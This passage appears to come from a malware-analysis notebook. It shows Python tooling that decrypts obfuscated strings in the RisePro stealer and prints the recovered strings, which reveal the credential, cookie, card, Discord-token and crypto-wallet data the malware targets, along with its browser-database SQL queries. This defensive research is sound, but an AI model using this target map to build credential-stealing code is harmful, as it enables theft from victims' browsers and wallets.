re.finditer(pxor_vpxor_vxorps_egg, section_data, re.DOTALL): xor_start = m.start() # Determine the instruction length xor_instruction = list(md.disasm(section_data[xor_start:xor_start+0x10], image_base + section_rva + xor_start))[0] xor_instruction_address = image_base + section_rva + xor_start if xor_instruction.mnemonic == &#39;pxor&#39; and xor_instruction.operands[0].type == X86_OP_REG and xor_instruction.operands[1].type == X86_OP_MEM: scan_length = 0x2000 if scan_length &gt; xor_start: scan_length = xor_start if xor_start - scan_length &lt; last_end: # Update last chunk with new end chunk_offsets[-1] = (chunk_offsets[-1][0], xor_start + 10) else: chunk_offsets.append((xor_start - scan_length, xor_start + 10)) last_end = xor_start + 10 chunks = [] for chunk_offset in chunk_offsets: chunk_data = section_data[chunk_offset[0]:chunk_offset[1]] chunk_instruction_address = image_base + section_rva + chunk_offset[0] instructions = [] for inst in md.disasm(chunk_data, chunk_instruction_address): instructions.append(inst) chunks.append(instructions) for chunk in chunks: chunk_len = len(chunk) for i in range(chunk_len): inst = chunk[i] if inst.mnemonic == &#39;pxor&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[1].type == X86_OP_MEM: tmp_string = get_string_from_pxor_ex(chunk[i::-1][:0x2000], inst.operands[0], inst.operands[1]) if tmp_string is not None: strings.append((inst.address,tmp_string)) return strings filename = &#39;/tmp/xorstr/work/rise.bin&#39; t = time.time() strings = get_strings_fast(filename) # Benchmark 50.47584390640259 metastealer print(f&quot;Benchmark {time.time() - t}&quot;) ss= string_builder(strings) print(f&quot;Strings recovered: {len(ss)}&quot;) print_unique_strings(ss) print(&quot;done&quot;) . Benchmark 15.065591096878052 Strings recovered: 743 Found strings: 665 0x4010ec 0.1 0x4011ab 50500 0x4064ef RisePro Telegram: https://t.me/RiseProSUPPORT 0x458e88 winhttp.dll 0x458f88 wininet.dll 0x459060 LocalSimbl 0x459123 LocalSimba 0x459463 grab_screen 0x4594d4 grab_tg 0x459542 grab_ds 0x4595b9 grab_wallets 0x459631 grab_ihistory 0x459717 logins 0x45977b Vault_IE 0x45982f logins 0x4598a4 WindowsCredentials 0x459adb .zip_ 0x459bc0 .zip 0x459df4 screenshot.png 0x459e97 Files 0x459f2f FileZilla 0x45a0eb Plugins 0x45a30a 0x45a526 IndexedDB 0x45a59c Sync 0x45a606 Local 0x45a66e 0x45a823 Wallets 0x45aa28 0x45ac41 IndexedDB 0x45acb7 Sync 0x45ad21 Local 0x45ad98 0x45afb0 History 0x45b10f _ 0x45b198 wb.txt 0x45b25f 0x45b4ed url 0x45b5ea time 0x45b7bc CC 0x45b944 _ 0x45b9d6 wb.txt 0x45ba9d 0x45be5d nickname 0x45bed6 name_on_card 0x45bfd0 card_number 0x45c0f5 last_four 0x45c246 **** **** **** 0x45c393 billing_address_id 0x45c46c - 0x45c555 exp_month 0x45c5ce exp_year 0x45c766 expiration_month 0x45c8a0 expiration_year 0x45c931 - 0x45ca9c Name: %s Nickna 0x45cb35 me: %s Month: %s Year: %s Card: %s Address: %s 0x45cdcb Autofill 0x45cf2e _ 0x45cfba wb.txt 0x45d2e7 name 0x45d364 value 0x45d483 %s %s 0x45d5b1 Downloads 0x45d702 _ 0x45d78b wb.txt 0x45d852 0x45dae2 url 0x45dbbb path 0x45ddaf Cookies 0x45df06 _ 0x45df8f ab.txt 0x45e056 0x45e36a domain 0x45e3e3 path 0x45e4db expirationDate 0x45e5eb L! 0x45e666 name 0x45e6df value 0x45e7d6 secure 0x45e858 TRUEFALSE 0x45e924 httpOnly 0x45e9a3 TRUE 0x45ea0d FALSE 0x45eb22 %s %s %s %s %llu %s %s 0x45ed83 _ 0x45ee06 ab.txt 0x45eeca 0x45f157 domain 0x45f2d2 path 0x45f3d4 expirationDate 0x45f465 name 0x45f559 value 0x45f6c9 TRUE 0x45f73c FALSE 0x45f7aa httpOnly 0x45f829 TRUEFALSE 0x45f986 %s %s %s %s %llu %s %s 0x45fb81 wb passwords.txt 0x45fe51 url 0x45fece login 0x45ffce password 0x4600bf profile 0x4602b4 Storage: %s [%s] URL: %s Login: %s Password: %s 0x46058c file 0x4605f7 url 0x4606f1 login 0x4607f1 password 0x4608f1 profile 0x460a7e Storage: %s [%s] URL: %s Login: %s Password: %s 0x460c3d wb discord.txt 0x460dfa Storage: %s UserName: %s E-MAIL: %s Token: %s 0x460f6c nss3.dll 0x46225b bhghoamapcdpbohphigoooaddinpkbai 0x462449 nkbihfbeogaeaoehlefnkodbefgpgknn 0x462691 cjelfplplebdjjenllpjcblmjkfcffne 0x46287f kncchdigobghenbbaddojjnnaogfppfj 0x462a82 fihkakfobkmkjojpchpfgcmhfjnmnfpi 0x462c83 nkddgncdjgjfcddamfgcmfnlhccnimig 0x462edb nanjmdknhkinifnkgdcggcfnhdaammmj 0x46307f nlbmnnijcnlegkjjpcfjclmcfggfefdm 0x46328e amkmjjmmflddogmhpjloimipbofnfjih 0x463491 nhnkbkgjikgcigadomkphalanndcapjk 0x463697 cphhlgmgameodnhkjdmkpanlelnlohao 0x46389a fnjhmkhhmkbjkkabndcnnogagogbneec 0x463a9d kpfopkelmapcoipemfendmdcghnegimn 0x463ca0 blnieiiffboillknjnepogjhkgnoapac 0x463ea1 hpglfhgfnhbgpjdenjgmdgoeiappafln 0x4640f9 hnfanknocfeofbddgcijnmhnfnkdnaad 0x46429d jbdaocneiiinmjbjlgalhcelgbejmnid 0x4646af ffnbelfdoeiohenkjibnmadjiehjhajb 0x4648fa fhbohimaelbohpjbbldcngcnapndodjp 0x464afd ibnejdfjmmkpcnlpebklmnkoeoihofec 0x464d00 bfnaelmomeimhlpmgjnjophhpkkoljpa 0x464e08 Oxygen 0x464edf fhilaheimglignddkjgofkcbgekhenbh 0x465036 PaliWallet 0x4650f7 mgffkfbidihjpoaomajlbgchddlicgpn 0x46531e aodkkagnadcbobfpggfnjeongemjbjca 0x465545 fmblappgoiilbgafhjklehhfifbdocee 0x46576c hmeobnfnfcmdkdcmlblgagmfpfboieaf 0x4659d8 dngmlblcodfobpdpecaadgfbcggfjfnm 0x465bff pdadjkfkgcafgbceimcpbkalnfnepbnk 0x465e26 aeachknmefphepccionboohckonoeemg 0x46604d aiifbnbfobpmeekipheeijimdpnlpgpp 0x466270 fnnegphlobjdpkhecapkijjdkgcjhkib 0x466497 lpfcbjknijpeeillifnkikgncikgfhdo 0x4666be aholpfdialjgjfhomihkjbmgjidlcdno 0x4668e5 afbcbjpbpfadlkmhmclhkeeodmamcflc 0x466a64 Keplr 0x466b0c dmkamcknogkgcdfhhbddcghachkejeap 0x466d33 fhmfendgdocmcbmfikdcogofphimnkno 0x466f5a cnmamaachppnkjgnildpdmkaakejnhae 0x467181 jojhfeoedkpkglbfimdfabpdfjaoolaf 0x4673a8 flpiciilemghbmfalicajoolhkkenfel 0x4675cf cgeeodpfagjceefieflmdfphplkenlfk 0x4677f6 acmacodkjbdgmoleebolmdjonilkdbch 0x467a1d odbfpeeihdkbihmopkbjmoonfanlbfcl 0x467c44 lpilbniiabackdjcionkobglmddfbcjo 0x467e6b bhhhlbepdkbapadjdnnojkbgioiodbic 0x468092 dkdedlpgdmmkkfjabffeganieamfklkm 0x4682b9 hcflpincpppdclinealmandijcmnkbgn 0x4684e0 mnfifefkajgofkcjkemidiaecocnkjeh 0x468707 ookjlbkiijinhpmnjffcofjonbfbgaoc 0x468929 jnkelfanjkeadonecabehalmbgpfodjm 0x468b4e jnlgamecbpmbajjfhmmmlhejkemejdma 0x468e13 kkpllkodjeloidieedojogacfhpaihoh 0x469032 mcohilncbfahbmgdjkbpemcciiolgcge 0x469243 epapihdplajcdnnkdeiahlgigofloibg 0x469454 gjagmgiddbbciopjhllkdnddhcglnemk 0x469665 kmhcihpebfmpgmihbkipmjlmmioameka 0x469883 bgpipimickeadkjlklgciifhnalhdjhe 0x469a04 Pontem Aptos Wallet 0x469af4 phkbamefinggmakgklpkljjmgibohnba 0x469d60 ejjladinnckdgjemekebdpeokbikhfci 0x469f87 gojhcdgcpbpfigcaejpfhfegekdgiblk 0x46a1f3 efbglgofoippbgcjepnhiblaibcnclgk 0x46a416 cjmkndjhnagcfbpiemnkdpomccnjblmj 0x46a682 aijcbedoijmgnlmjeegjaglmepbmpkpi 0x46a8a9 egjidjbpglichdcondbcbdnbeeppgdph 0x46ab15 oeljdldpnmdbchonielidgobddffflal 0x46ad7c ilgcnhelpchnceeipipijaljkblbcobl 0x46afe3 imloifkgjagghnnc 0x46b05b jkhggdhalmcnfklk 0x46b44e Local StateLogin Data 0x46bbe9 cookies 0x46bc81 Local StateCookies 0x46bf4f Login Data 0x46c133 Mozilla FirefoxFirefox WaterfoxWaterfox 0x46c3c3 Comodo IceDragonIceDragon 0x46c4c9 berfox 0x46c5aa ogies BlackHaw 0x46c679 Moonchild Productions Pale MoonPale Moon 0x46c785 DiscordDiscord 0x46c81a discordcanaryDiscordCanary discordptbDiscordPTB 0x46c959 discorddevelopmentDiscordDevelopment 0x46ca56 Opera SoftwareOpera 0x46caf4 Google Chrome User DataChrome 0x46cbd5 Microsoft Edge User DataEdge 0x46cced BraveSoftware Brave-Browser User DataBrave 0x46cde7 CryptoTab Browser User DataCryptoTab Battle.netBattle.net 0x46cf71 Chromium User DataChromium 0x46d048 Google(x86) Chrome User DataChrome (x86) 0x46d135 Yandex YandexBrowser User DataYandex 0x46d21f NVIDIA Corporation NVIDIA GeForce ExperienceNVIDIA SteamSteam 0x46d3ef Amigo User User DataAmigo 0x46d4df Iridium User DataIridium 0x46d5c4 MapleStudio ChromePlus User DataChromePlus 0x46d6f0 7Star 7Star User Data7Star 0x46d7dc CentBrowser User DataCentBrowser 0x46d8b5 Chedot User DataChedot 0x46d98b Vivaldi User DataVivaldi 0x46da73 Kometa User DataKometa 0x46db5a Elements Browse 0x46dbc4 Elements Browser 0x46dc63 Epic Privacy Br 0x46dcf8 Epic Privacy Bro 0x46dd87 uCozMedia Uran User DatauCozMedia 0x46dea9 Fenrir Inc Sleipnir5 setting modules ChromiumViewerChromiumViewer 0x46e038 CatalinaGroup Citrio User DataCitrio 0x46e0f3 Coowon Coowon User DataCoowon 0x46e1dd liebao User Datliebao 0x46e2a4 QIP Surf User DtaQIP Surf 0x46e384 Orbitum User DaaOrbitum 0x46e47b Comodo Dragon User DataDragon 0x46e544 Torch User Data 0x46e5af Torch 0x46e625 Comodo User DataComodo 0x46e71b 360Browser Browser User Data360Browser 0x46e7e3 Maxthon3 User DataMaxthon3 0x46e8c2 K-Melon User DataK-Melon 0x46e994 Sputnik Sputnik User DataSputnik 0x46ea87 Nichrome User DataNichrome 0x46eb78 CocCoc Browser User DataCocCoc 0x46ec3a Uran User DataUran 0x46ecfd Chromodo User DataChromodo 0x46edb3 Mail.Ru Atom User DataAtom 0x46ee8c NetboxBrowser User DataNetboxBrowser 0x46f0f1 rule_exceptionsrule_filesrule_folderrule_size_kb 0x46f262 rule_collect_recursv 0x46f301 : 0x46f386 , 0x46f412 %DESKTOP% 0x46f548 %DOCUMENTS% 0x46f683 %USERPROFILE% 0x46f7be %APPDATA% 0x46f8f9 %LOCALAPPDATA% 0x46fa31 %RECENT% 0x46fbea (.-)* 0x46fca1 (.-) 0x46fd44 (.*)(.-)(.-) 0x470047 / 0x4707ca ld_name 0x470890 ld_geo 0x470a69 0x470b12 , 0x470d36 mark_check_cookies 0x470e08 mark_check_passwords 0x470eda mark_check_history 0x470fb6 mark_domains 0x471037 , 0x471217 domain 0x47133e . 0x4715cc domain 0x4716f3 . 0x4718e4 url 0x472087 .exe 0x4720fc . 0x4721c8 exe 0x472259 msi 0x4722ea scr 0x47237b txt 0x47240c doc 0x47249d docx 0x47252e png 0x4725c2 jpg 0x472656 jpeg 0x4726ea bmp 0x47277e bat 0x472818 vbs 0x472a10 exe 0x472a99 . 0x472b1c 0x472c1a https:// 0x472d06 open 0x472ee5 Telegram Desktop 0x473004 tdata 0x473074 rb key_datas 0x473165 *.* 0x473204 rb maps 0x473450 Telegram 0x4734dd tdata 0x473572 key_datas 0x473773 0x473833 maps 0x473896 maps 0x473b1d s 0x473b84 0x473d73 logins 0x473eb6 profile 0x473f69 url 0x47400a login 0x47408b password 0x47410b logins 0x4743fc profile 0x474490 url 0x474548 login 0x474601 password 0x4746b9 logins 0x47482c profile 0x4748c1 url 0x474978 login 0x474a31 password 0x474ad7 logins 0x474bef vaultcli.dll 0x474c68 VaultEnumerateItems 0x474cfd VaultEnumerateVaultsVaultFreeVaultOpenVaultVaultCloseVaultVaultGetItemVaultGetItem 0x474f9e history 0x47504d profiles.ini 0x4750f2 Profile 0x47519d Path 0x475208 0x4752ea / 0x4753c2 0x4754a3 places.sqlite 0x47552b rb 0x47577a SELECT place_id, visit_date FROM 0x475904 (SELECT place_id, visit_date, id FROM moz_historyvisits ORDER BY id DESC LIMIT 2500) ORDER BY id ASC 0x475a59 ) 0x475ae0 SELECT url FROM 0x475b51 moz_places WHERE 0x475bc1 (`id` = 0x475e9f history 0x475fb9 cookies 0x476068 profiles.ini 0x47611f Profile 0x4761e2 Path 0x476267 0x476340 / 0x476426 0x476509 cookies.sqlite 0x476596 rb 0x476741 SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies 0x476b0b httpOnly 0x476c9e secure 0x476e0e value 0x476ed0 cookies 0x476ffb download_history 0x4770ea profiles.ini 0x4771b6 Profile 0x477276 Path 0x4772f6 0x4773db / 0x4774c1 0x47759d places.sqlite 0x477625 rb 0x4777b8 SELECT place_id, content FROM moz_annos WHERE (`anno_attribute_id` = 1) 0x477980 ) 0x4779f5 SELECT url FROM 0x477a63 moz_places WHERE 0x477ad3 (`id` = 0x477cbd file:/// 0x477edb download_history 0x47802e autofill 0x4780f1 profiles.ini 0x4781a4 Profile 0x478267 Path 0x4782e9 0x4783d1 / 0x4784ba 0x47857c formhistory.sqlite 0x47865f rb 0x478785 SELECT fieldname, value FROM moz_formhistory 0x478a69 autofill 0x478b7c logins 0x478c25 profiles.ini 0x478cd4 Profile 0x478d8f Path 0x478e0f 0x478ed7 logins.json 0x478f5f rb 0x478ff2 signons.sqlite 0x479146 SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins 0x4794cc login 0x479959 formSubmitURL 0x479bd6 logins 0x479e48 NSS_InitNSS_Shutdown 0x479f01 PK11_GetInternalKeySlotPK11_FreeSlot 0x479fe3 PK11_AuthenticatePK11SDR_Decrypt 0x47a281 0x47a433 Local State 0x47a4d6 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47a7a9 Local State 0x47a932 os_crypt 0x47aa2c encrypted_key 0x47aaae os_crypt 0x47ab28 encrypted_key 0x47ac21 0x47ae67 .log 0x47af0c .ldb 0x47b24e dQw4w9WgXcQ:[^.* [&#39;(.*)&#39; ].*$][^&#34;]* 0x47b3fa dQw4w9WgXcQ: 0x47b6f6 discord.com/api/v9/users/@me 0x47b815 usernameemailusername 0x47b930 email 0x47be84 CURRENT Sync Extension Settings 0x47bfed CURRENT Local Extension Settings 0x47c163 _0.indexeddb.leveldb CURRENT IndexedDB chrome-extension_ 0x47c62a Settings Sync Extension 0x47c789 Settings Local Extension 0x47c8f5 e-extension_ IndexedDB chromeldb _0.indexeddb.lev 0x47cad5 CURRENT 0x47cd9d history 0x47cef7 0x47d3f0 SELECT url, last_visit_time FROM(SELECT url, last_visit_time, id FROM urls ORDER 0x47d5a4 BY id DESC LIMIT 2500) ORDER BY id ASC 0x47d942 cookies 0x47dacd Network 0x47dd3f 0x47de18 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47e0da 0x47e29d os_crypt 0x47e397 encrypted_key 0x47e419 os_crypt 0x47e493 encrypted_key 0x47e5d2 Network 0x47e900 SELECT host_key, is_httponly, path, is_secure, expires_utc, name, value, encrypted_value FROM cookies 0x47ed54 httpOnly 0x47eed2 secure 0x47f0f6 v10 0x47f175 v11 0x47f23e value 0x47f529 cards 0x47f682 0x47f92a os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x47fbfb 0x47fdc4 os_crypt 0x47febe encrypted_key 0x47ff40 os_crypt 0x47ffba encrypted_key 0x4803bc SELECT name_on_card, expiration_ 0x480546 month, expiration_year, card_number_encrypted, origin, billing_address_id, nickname FROM credit_cards 0x4809f6 v10 0x480a72 v11 0x480c18 billing_address_ 0x480f38 SELECT name_on_card, exp_month, 0x4810be exp_year, last_four, nickname, bank_name, card_art_url, status, network FROM masked_credit_cards 0x4814ab last_four 0x4816b7 status 0x481975 download_history 0x481b13 0x481f6f SELECT tab_url, target_path FROM downloads 0x482359 autofill 0x4824b3 0x4828d1 SELECT name, value FROM autofill 0x482cba logins 0x482dfa 0x483080 os_cryptos_cryptencrypted_keyos_cryptencrypted_key 0x483322 0x4834e2 os_crypt 0x4835dc encrypted_key 0x48365e os_crypt 0x4836d8 encrypted_key 0x4839f8 SELECT action_url, origin_url, username_value, password_value FROM logins 0x483cdf v10 0x483d59 v11 0x483e0a profile 0x48414b * 0x48422a 0x484369 v10v11 0x484825 90 0x48489b 3 0x484ac9 freebl3.dllmozglue.dllnss3.dllsoftokn3.dllmsvcp140.dll 0x484cae vcruntime140.dll 0x484d88 0x48541e wb 0x48565d An uncaught exception occurred3: 0x485869 An uncaught exception occurred3. The type was unknown so no information was available. 0x485da0 api.myip.com 0x485e6b ip 0x485f57 cc 0x4860d3 An uncaught exception occurred_ip0_1: 0x486300 An uncaught exception occurred_ip0_1. The type was unknown so no information was available. 0x486460 api64.ipify.org/?format=json 0x486542 ip 0x4866d6 An uncaught exception occurred_ip0_2: 0x486907 An uncaught exception occurred_ip0_2. The type was unknown so no information was available. 0x486a7d ipinfo.io/widget/demo/ 0x486b5c data 0x486c2c country 0x486c96 data 0x486cfb country 0x486d7b data 0x486ddf city 0x486e47 data 0x486eab city 0x486fb6 An uncaught exception occurred_ip1: 0x4871e3 An uncaught exception occurred_ip1. The type was unknown so no information was available. 0x487351 db-ip.com/demo/home.php?s= 0x487430 demoInfo 0x487507 countryCode 0x487574 demoInfo 0x4875dd countryCode 0x487660 demoInfo 0x4876c4 city 0x48772f demoInfo 0x487793 city 0x48789f An uncaught exception occurred_ip2: 0x487acc An uncaught exception occurred_ip2. The type was unknown so no information was available. 0x487c81 www.maxmind.com/geoip/v2.1/city/me 0x487d6c country 0x487ead iso_code 0x487f1a country 0x487f7f iso_code 0x487fe9 city 0x48804e names 0x4880b1 en 0x48811c country 0x488181 iso_code 0x488207 city 0x48826c names 0x4882cf en 0x488405 An uncaught exception occurred_ip4: 0x48863e An uncaught exception occurred_ip4. The type was unknown so no information was available. 0x48874a 1.1.1.1 0x4887b4 ZZ 0x488828 Unknown 0x488af8 0x488d05 msvcp140.dll 0x488d90 vcruntime140.dll 0x488e27 freebl3.dll 0x488e95 mozglue.dll 0x488f00 nss3.dll 0x488f6a softokn3.dll 0x489009 DLL 0x489209 :// 0x489343 mark_name 0x4894c4 atomic Local Storage 0x48955b Atomic 0x489698 Electrum wallets 0x489731 Electrum 0x48985a Exodus exodus.wallet 0x4898f0 Exodus 0x489a19 Electrum-LTC wallets 0x489ab2 ElectrumLTC 0x489b97 Monero wallets 0x489c1d Monero 0x489d43 com.liberty.jaxx 0x489ddf Jaxx Liberty 0x489e62 IndexedDB 0x48a000 Local Storage 0x48a1d3 Session Storage 0x48a442 Jaxx Local Storage 0x48a4d5 Jaxx 0x48a5f8 Coinomi Coinomi wallets 0x48a68b Coinomi 0x48a764 Armory 0x48a90d WalletWasabi Client Wallets 0x48a9a0 Wasabi 0x48aac1 Bither bither.db 0x48ab56 Bither 0x48abce bither.db 0x48acd6 ElectronCash wallets 0x48ad6b ElectronCash 0x48ae90 Binance app-store.json 0x48af25 Binance 0x48afa1 app-store.json 0x48b0a6 Ethereum wallets 0x48b137 Ethereum 0x48b211 Guarda 0x48b310 IndexedDB 0x48b4a6 Local Storage 0x48b673 Session Storage 0x48b8df MultiDoge multidoge.wallet 0x48b97a MultiDoge 0x48ba31 multidoge.wallet 0x48bb0e Bitcoin 0x48bb77 DogecoinAnoncoin 0x48bc38 BBQCoinBBQCoinDashCoreFlorincoinFrankoFreicoin 0x48be71 GoldCoin (GLD) 0x48bed4 IOCoin 0x48bf39 InfinitecoinIxcoin 0x48bffd MegacoinMincoinNamecoin 0x48c123 PrimecoinTerracoinYACoinZcashdevcoindigitalcoin 0x48c35e LitecoinReddcoin 0x48c449 Daedalus Mainnet 0x48c4cb Ledger Live 0x48c629 0x48c6f1 wallet.dat 0x48c7f8 wallet.dat wallet.dat 0x48c90a wallets 0x48c97a 0x48ca1c wallets 0x48cbb7 Authy Desktop 0x48cc64 Authy 0x48ccf7 IndexedDB 0x48ce9a Local Storage 0x48d056 Session Storage 0x48d328 *.* 0x48d689 information.txt 0x48d734 wb 0x48d7c3 Version: %s 0x48d837 Date: %sUnknown 0x48d90d SOFTWARE Microsoft Cryptography 0x48d9cf MachineGuid 0x48da64 MachineID: %s Unknown 0x48db55 GUID: %s ___ 0x48ddcb HWID: %s 0x48de4a Path: %s Work Dir: %s IP: %s 0x48dfac Location: %s, %s 0x48e090 SOFTWARE Microsoft Windows NT CurrentVersion 0x48e17b ProductNamex64x32 0x48e26b Windows: %s [%s] 0x48e36c Computer Name: %s 0x48e41f User Name: %s 0x48e4b2 Display Resolution: %dx%d 0x48e5aa Display Language: %ws Display Language: Unknown 0x48e68a Keyboard Languages: 0x48e78e / %s 0x48e879 Local Time: %d/%d/%d %d:%d:%d 0x48e9c8 TimeZone: UTC%d 0x48ea2e [Hardware] 0x48eac0 HARDWARE DESCRIPTION System CentralProcessor 0 0x48ebf5 ProcessorNameStringProcessor: %s 0x48ecf9 CPU Count: %d 0x48ed73 RAM: %u MB 0x48eed7 VideoCard #%d: %s 0x48efd1 [Processes] 0x48f074 %s [%d] 0x48f0dd [Software] 0x48f198 SOFTWARE Microsoft Windows CurrentVersion Uninstall 0x48f309 %s %s 0x48f3cd DisplayName 0x48f462 DisplayVersion 0x48f4cf %s [%s] 0x48f5b9 wb 0x48f835 %X 0x49000f rb 0x490153 RtlGetVersionNtdll.dll 0x490244 rb 0x490d15 http:/// 0x490dfa ? 0x49128d . 0x4912f3 .dll 0x49135f # 0x491491 WINHTTP.dllWinHttpConnect 0x49154f WinHttpQueryHeadersWinHttpOpen 0x49162a WinHttpOpenRequest 0x4916bd WinHttpQueryDataAvailable 0x49174c WinHttpSendRequest 0x4917df WinHttpReceiveResponseWinHttpReadData 0x4918c2 WinHttpCloseHandle 0x49194e WinHttpSetTimeouts 0x491d1e wb 0x491e39 HEAD 0x4920ed InternetOpenA 0x492159 InternetSetOptionA 0x4921e6 HttpOpenRequestA 0x492273 InternetConnectA 0x492300 InternetOpenUrlA 0x492372 HttpQueryInfoA 0x4923de InternetQueryOptionA 0x49246b HttpSendRequestA 0x4924f8 InternetReadFile 0x492585 InternetCloseHandle done . Hard Limitations . The current approach will only work if the memory taint/trace is built in order in the code. For samples other than RisePRO compiler optimizations can lead to the &quot;base&quot; of the memory being located after the conents of the memory are filled - making a reverse linear search impossible. See the following example with private loader. . .text:00991077 B8 2D 33 69 8B mov eax, 8B69332Dh .text:0099107C C7 45 B8 05 4F 11 7C mov dword ptr [ebp-48h], 7C114F05h .text:00991083 89 45 BC mov [ebp-44h], eax .text:00991086 8B 4D B8 mov ecx, [ebp-48h] .text:00991089 8B 55 BC mov edx, [ebp-44h] .text:0099108C 89 4D A0 mov [ebp-60h], ecx ; base offset .text:0099108F 89 55 A4 mov [ebp-5Ch], edx ; base offset + 4 (next chunk) . The following is our failed attempt at a reverse linear search. This code may be of interest for future projects but it cannot acomplish the task above. . def get_xmm_data_recursive(instructions, opr, displacement=0): logger.debug(f&quot;get_xmm_data_recursive: {opr}, displacement={displacement}&quot;) # Sanity check if opr.type != X86_OP_MEM and opr.type != X86_OP_REG: logger.debug(f&quot;ERROR Operand type is not X86_OP_MEM or X86_OP_REG&quot;) return None # Track the opr memory as it moves between register and memory instruction_count = len(instructions) for ptr in range(instruction_count): inst = instructions[ptr] #logger.debug(f&quot;recursive testing {inst} at {hex(inst.address)} &quot;) # If the opr memory we are searching for is ESP then we need to check for stack changes if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;sub&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[0].reg == X86_REG_ESP: if ptr+1 &lt; instruction_count and instructions[ptr+1].mnemonic == &#39;call&#39;: logger.debug(f&quot;Assuming stack change is for call at {hex(inst.address)}&quot;) else: if inst.operands[1].type != X86_OP_IMM: logger.debug(f&quot;ERROR: Expected immediate value for stack change&quot;) return None displacement -= inst.operands[1].value.imm logger.debug(f&quot;{hex(inst.address)}: sub esp New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;add&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[0].reg == X86_REG_ESP: if inst.operands[1].type != X86_OP_IMM: logger.debug(f&quot;ERROR: Expected immediate value for stack change&quot;) return None displacement += inst.operands[1].value.imm logger.debug(f&quot;{hex(inst.address)}: add esp New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;push&#39;: displacement -= 4 logger.debug(f&quot;{hex(inst.address)}: push New displacement: {hex(displacement)}&quot;) if opr.type == X86_OP_MEM and opr.value.mem.base == X86_REG_ESP and inst.mnemonic == &#39;pop&#39;: displacement += 4 logger.debug(f&quot;{hex(inst.address)}: pop New displacement: {hex(displacement)}&quot;) # Track the movs to see if they have the memory/register we are looking for if inst.mnemonic[:3] == &#39;mov&#39;: if opr.type == X86_OP_MEM and inst.operands[0].type == X86_OP_MEM: inst_op_mem = inst.operands[0].value.mem if inst_op_mem.disp == opr.value.mem.disp + displacement and inst_op_mem.base == opr.value.mem.base and inst_op_mem.index == opr.value.mem.index and inst_op_mem.scale == opr.value.mem.scale: if inst.operands[1].type == X86_OP_IMM: # This might be the base with the first immedate move test of missing 3 chunks logger.debug(f&quot;Test new base at with imm at {hex(inst.address)}&quot;) out_data = struct.pack(&#39;&lt;I&#39;, inst.operands[1].value.imm) flag_failed = False for i in [4, 8, 12]: tmp_chunk = get_imm_data_recursive(instructions[ptr:], inst.operands[1], displacement=i) if tmp_chunk is None: logger.debug(f&quot;Error no xmm found for {opr} at displacement {i}&quot;) flag_failed = True break logger.debug(f&quot;Found chunk {tmp_chunk}&quot;) out_data += struct.pack(&#39;&lt;I&#39;, tmp_chunk) if not flag_failed: return out_data logger.debug(&quot;Base incorrect continuing search...&quot;) if inst.operands[1].type == X86_OP_REG: logger.debug(f&quot;Found memory switch at {hex(inst.address)} {inst} recursive search...&quot;) return get_xmm_data_recursive(instructions[ptr:], inst.operands[1]) elif opr.type == X86_OP_REG and inst.operands[0].type == X86_OP_REG: if inst.operands[0].reg == opr.reg: if inst.operands[1].type == X86_OP_MEM: if inst.operands[1].value.mem.base == X86_REG_ESP or inst.operands[1].value.mem.base == X86_REG_EBP: # This is as the new base if it doesn&#39;t work keep tracking with the new opr logger.debug(f&quot;Test new base at {hex(inst.address)} {inst}&quot;) out_data = b&#39;&#39; flag_failed = False for i in [0, 4, 8, 12]: tmp_chunk = get_imm_data_recursive(instructions[ptr:], inst.operands[1], displacement=i) if tmp_chunk is None: logger.debug(f&quot;Error no xmm found for {opr} at displacement {i}&quot;) flag_failed = True break logger.debug(f&quot;Found chunk {tmp_chunk}&quot;) out_data += struct.pack(&#39;&lt;I&#39;, tmp_chunk) if not flag_failed: return out_data logger.debug(&quot;Base incorrect continuing search...&quot;) else: new_op = X86Op() new_op.value = X86OpValue(inst.operands[1].value.mem.base) new_op.type = X86_OP_REG logger.debug(f&quot;Found memory switch with new register at {hex(inst.address)} {inst} recursive search...&quot;) return get_xmm_data_recursive(instructions[ptr:], new_op) logger.debug(f&quot;Found memory switch at {hex(inst.address)} {inst} recursive search...&quot;) return get_xmm_data_recursive(instructions[ptr:], inst.operands[1]) return None def get_string_from_pxor_xmm(instructions, xmm0, xmm1): data0 = get_xmm_data_recursive(instructions, xmm0, displacement=0) if data0 is None: logger.debug(f&quot;Error no data found for xmm0 {xmm0}&quot;) return None logger.debug(f&quot;Found data for xmm0 {data0.hex()}&quot;) data1 = get_xmm_data_recursive(instructions, xmm1, displacement=0) if data1 is None: logger.debug(f&quot;Error no data found for xmm1 {xmm1}&quot;) return None logger.debug(f&quot;Found data for xmm1 {data0.hex()}&quot;) out = xor(data0, data1) logger.debug(out) out = out.replace(b&#39; x00&#39;,b&#39;&#39;) if len(out) == 0: return None if not is_ascii(out): return None return out.decode(&#39;utf-8&#39;) . Memory-Only Emulation Trace (@mishap) . A more comprehensive approach may be to use this novel memory-only emulation approach by @mishap. . pxor_string_decrypt_wip.py . Algorithm . disassemble the target code block | setup a global stack and registers (maintain state as we &quot;emulate&quot;) | iterate through each instruction | for instructions that manipulate memory implement a handler | when we hit a pxor instruction the operands should be populated with the correct data due to our memory emulation | . Ideas for Improvement . For the stack use a dict where ESP is the key | Implement instructions that have an effect on ESP and track this register in the instruction handlers | Hack - track calls and don&#39;t adjust ESP if done directly after a call (assume this is stack cleanup) | Make sure instruction handlers are an exact match for the instructions | Rest the stack and registers when a ret or ??? instruction is hit | . import time from typing import List import pefile from capstone import * from capstone.x86 import * import re import struct STACK_SIZE = 0x10000 CHUNK_SIZE = 0x400 # 128 bit pack/unpack def pack_128(val): a = val &amp; 0xFFFFFFFFFFFFFFFF b = (val &gt;&gt; 64) &amp; 0xFFFFFFFFFFFFFFFF return struct.pack(&#39;&lt;QQ&#39;, a, b) def unpack_128(val): try: a, b = struct.unpack(&#39;&lt;QQ&#39;, val) return a | (b &lt;&lt; 64) except: return 0 class Env: def __init__(self): self.stack 